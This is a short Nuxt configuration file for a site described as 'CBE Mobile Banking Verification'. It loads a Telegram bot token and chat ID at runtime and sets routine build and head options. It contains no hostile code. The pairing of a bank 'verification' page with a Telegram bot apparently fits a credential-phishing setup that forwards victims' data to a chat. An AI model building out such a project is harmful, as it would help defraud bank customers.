/// <reference types="nuxt" />
import process from 'node:process'

// https://nuxt.com/docs/api/configuration/nuxt-config
export default defineNuxtConfig({
  compatibilityDate: '2025-07-15',
  srcDir: 'app',
  dir: {
    public: '../public'
  },
  devtools: { enabled: true },
  runtimeConfig: {
    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN,
    telegramChatId: process.env.TELEGRAM_CHAT_ID
  },
  nitro: {
    externals: {
      inline: [
        'vue',
        'vue-router',
        'vue-bundle-renderer',
        '@vue/shared',
        '@vue/server-renderer'
      ]
    }
  },
  app: {
    head: {
      meta: [
        { name: 'viewport', content: 'width=device-width, initial-scale=1' },
        { name: 'description', content: 'CBE Mobile Banking Verification' }
      ],
      link: [
        { rel: 'icon', type: 'image/x-icon', href: '/favicon.ico' }
      ]
    }
  }
})
